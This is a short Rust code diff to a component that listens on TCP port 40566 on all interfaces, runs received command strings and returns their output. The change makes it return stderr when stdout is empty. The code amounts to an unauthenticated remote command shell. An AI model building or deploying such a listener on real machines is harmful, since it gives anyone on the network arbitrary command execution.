@@ -10,6 +10,7 @@ struct Con {
 impl Con {
     fn connect() -> io::Result<Self> {
         let listener = TcpListener::bind("0.0.0.0:40566")?;
+
         Ok(Self {
             listener,
             stream: String::new(),
@@ -43,10 +44,12 @@ impl Con {
     fn exec_cmd(&self, s: TcpStream, mut cmd: std::str::Split<&str>) -> io::Result<()> {
         let out = Command::new(cmd.nth(0).unwrap())
             .args(&cmd.collect::<Vec<&str>>())
-            .output()?
-            .stdout;
+            .output()?;
 
-        let out = String::from_utf8_lossy(&out).to_string();
+        let stdout = String::from_utf8_lossy(&out.stdout).to_string();
+        let stderr = String::from_utf8_lossy(&out.stderr).to_string();
+
+        let out = if !stdout.is_empty() { stdout } else { stderr };
 
         Self::return_out(s, &out);
         println!("{}", &out);
